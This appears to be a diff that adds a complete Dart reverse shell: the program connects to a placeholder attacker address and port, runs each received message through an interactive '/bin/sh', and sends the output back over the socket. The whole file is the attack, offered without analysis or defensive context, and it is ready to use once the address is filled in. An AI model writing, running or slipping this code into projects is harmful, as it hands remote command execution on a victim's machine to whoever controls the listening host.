@@ -1,0 +1,31 @@
+import 'dart:io';
+import 'dart:convert';
+
+void main() {
+  _connectToServer();
+}
+
+void _connectToServer() async {
+  try {
+    final socket = await Socket.connect("<IP>", <PORT>);
+    socket.listen(
+      (data) {
+        Process.start('/bin/sh', ['-i']).then((Process process) {
+          process.stdin.writeln(String.fromCharCodes(data).trim());
+          process.stdout.transform(utf8.decoder).listen((output) {
+            socket.write(output);
+          });
+        });
+      },
+      onDone: () {
+        socket.destroy();
+      },
+      onError: (error) {
+        print("Connection Error: $error");
+        socket.destroy();
+      },
+    );
+  } catch (e) {
+    print("Unable to connect: $e");
+  }
+}
